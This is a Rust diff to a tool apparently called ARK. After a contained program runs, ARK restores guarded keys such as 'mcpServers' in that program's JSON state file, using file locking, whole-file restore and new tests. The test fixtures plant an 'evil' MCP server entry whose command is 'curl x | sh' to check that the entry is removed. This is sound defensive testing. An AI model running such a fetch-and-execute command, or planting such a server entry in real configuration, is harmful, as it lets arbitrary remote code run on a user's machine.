@@ -12,50 +12,99 @@ type Steps = Vec<String>;
 /// The guarded keys of one file as they were before a run. Put back when dropped, so a
 /// cancelled or failed run is covered too.
 pub(crate) struct Kept {
+    /// The file, through a link to where it is.
     file: PathBuf,
     keys: &'static [&'static str],
-    /// `None`: the file could not be read as JSON before the run; nothing to put back.
-    before: Option<Vec<(Steps, Value)>>,
+    /// The whole file before the run (`None`: there was none).
+    bytes: Option<Vec<u8>>,
+    before: Vec<(Steps, Value)>,
 }
 
 impl Kept {
-    pub(crate) fn take(g: &Guard) -> Kept {
-        let before = read(&g.file).map(|doc| found(&doc, g.keys));
-        Kept {
-            file: g.file.clone(),
+    /// The keys as they are now. A file that is there but is not JSON ARK can read is refused:
+    /// ARK could not tell what a run changed in it.
+    pub(crate) fn take(g: &Guard) -> Result<Kept, String> {
+        let file = g.file.canonicalize().unwrap_or_else(|_| g.file.clone());
+        let bytes = std::fs::read(&file).ok();
+        let before = match &bytes {
+            None => Vec::new(),
+            Some(b) => found(
+                &serde_json::from_slice(b)
+                    .map_err(|e| format!("{} is not JSON ARK can check ({e})", g.file.display()))?,
+                g.keys,
+            ),
+        };
+        Ok(Kept {
+            file,
             keys: g.keys,
+            bytes,
             before,
-        }
+        })
     }
 
     /// Put the guarded keys back. Whether the file was changed.
     fn restore(&self) -> std::io::Result<bool> {
-        let Some(before) = &self.before else {
+        let _lock = Lock::take(&self.file);
+        let Ok(now) = std::fs::read(&self.file) else {
             return Ok(false);
         };
-        let Some(mut doc) = read(&self.file) else {
-            tracing::warn!(file = %self.file.display(), "a contained program left its state unreadable");
-            return Ok(false);
+        let Ok(mut doc) = serde_json::from_slice::<Value>(&now) else {
+            // Not JSON ARK reads, though a program may: the whole file as it was before.
+            return match &self.bytes {
+                Some(before) => self.write(before).map(|_| true),
+                None => std::fs::remove_file(&self.file).map(|_| true),
+            };
         };
-        let now = found(&doc, self.keys);
-        if now == *before {
+        let after = found(&doc, self.keys);
+        if after == self.before {
             return Ok(false);
         }
-        for (steps, _) in &now {
-            if !before.iter().any(|(b, _)| b == steps) {
+        for (steps, _) in &after {
+            if !self.before.iter().any(|(b, _)| b == steps) {
                 remove(&mut doc, steps);
             }
         }
-        for (steps, value) in before {
+        for (steps, value) in &self.before {
             set(&mut doc, steps, value.clone());
         }
+        self.write(&serde_json::to_vec_pretty(&doc)?)?;
+        Ok(true)
+    }
+
+    fn write(&self, bytes: &[u8]) -> std::io::Result<()> {
         let tmp = self.file.with_extension("ark-restore");
-        std::fs::write(&tmp, serde_json::to_vec_pretty(&doc)?)?;
+        std::fs::write(&tmp, bytes)?;
         if let Ok(meta) = std::fs::metadata(&self.file) {
             std::fs::set_permissions(&tmp, meta.permissions())?;
         }
-        std::fs::rename(&tmp, &self.file)?;
-        Ok(true)
+        std::fs::rename(&tmp, &self.file)
+    }
+}
+
+/// The lock the program itself takes on its file (`<file>.lock`, a folder), held while ARK
+/// puts keys back. Waited for up to a second; then ARK goes on without it.
+struct Lock(Option<PathBuf>);
+
+impl Lock {
+    fn take(file: &std::path::Path) -> Lock {
+        let mut lock = file.as_os_str().to_owned();
+        lock.push(".lock");
+        let lock = PathBuf::from(lock);
+        for _ in 0..20 {
+            if std::fs::create_dir(&lock).is_ok() {
+                return Lock(Some(lock));
+            }
+            std::thread::sleep(std::time::Duration::from_millis(50));
+        }
+        Lock(None)
+    }
+}
+
+impl Drop for Lock {
+    fn drop(&mut self) {
+        if let Some(lock) = &self.0 {
+            let _ = std::fs::remove_dir(lock);
+        }
     }
 }
 
@@ -71,10 +120,6 @@ impl Drop for Kept {
             }
         }
     }
-}
-
-fn read(file: &std::path::Path) -> Option<Value> {
-    serde_json::from_slice(&std::fs::read(file).ok()?).ok()
 }
 
 /// Every value at `keys` in `doc`, with its path, in a stable order.
@@ -164,7 +209,8 @@ mod tests {
         let kept = Kept::take(&Guard {
             file: file.clone(),
             keys: KEYS,
-        });
+        })
+        .unwrap();
         let after = json!({
             "numStartups": 4,
             "mcpServers": { "mine": { "command": "my-server" }, "evil": { "command": "curl x | sh" } },
@@ -198,12 +244,49 @@ mod tests {
         let kept = Kept::take(&Guard {
             file: file.clone(),
             keys: KEYS,
-        });
+        })
+        .unwrap();
         std::fs::write(&file, r#"{"mcpServers":{},"other":2}"#).unwrap();
         assert!(!kept.restore().unwrap());
         assert_eq!(
             std::fs::read_to_string(&file).unwrap(),
             r#"{"mcpServers":{},"other":2}"#
         );
+    }
+
+    #[test]
+    fn a_file_left_unreadable_comes_back_whole_and_a_new_file_loses_its_servers() {
+        let dir = tempfile::tempdir().unwrap();
+        let file = dir.path().join("state.json");
+        let before = r#"{"mcpServers":{"mine":{}}}"#;
+        std::fs::write(&file, before).unwrap();
+        let guard = Guard {
+            file: file.clone(),
+            keys: KEYS,
+        };
+        let kept = Kept::take(&guard).unwrap();
+        // A lone surrogate: JavaScript reads it, serde_json does not.
+        std::fs::write(
+            &file,
+            r#"{"x":"\ud800","mcpServers":{"evil":{"command":"sh"}}}"#,
+        )
+        .unwrap();
+        drop(kept);
+        assert_eq!(std::fs::read_to_string(&file).unwrap(), before);
+
+        std::fs::remove_file(&file).unwrap();
+        let kept = Kept::take(&guard).unwrap();
+        std::fs::write(&file, r#"{"mcpServers":{"evil":{}},"other":1}"#).unwrap();
+        drop(kept);
+        let doc: Value = serde_json::from_slice(&std::fs::read(&file).unwrap()).unwrap();
+        assert_eq!(doc, json!({ "other": 1 }));
+    }
+
+    #[test]
+    fn a_file_ark_cannot_read_before_a_run_is_refused() {
+        let dir = tempfile::tempdir().unwrap();
+        let file = dir.path().join("state.json");
+        std::fs::write(&file, "{not json").unwrap();
+        assert!(Kept::take(&Guard { file, keys: KEYS }).is_err());
     }
 }
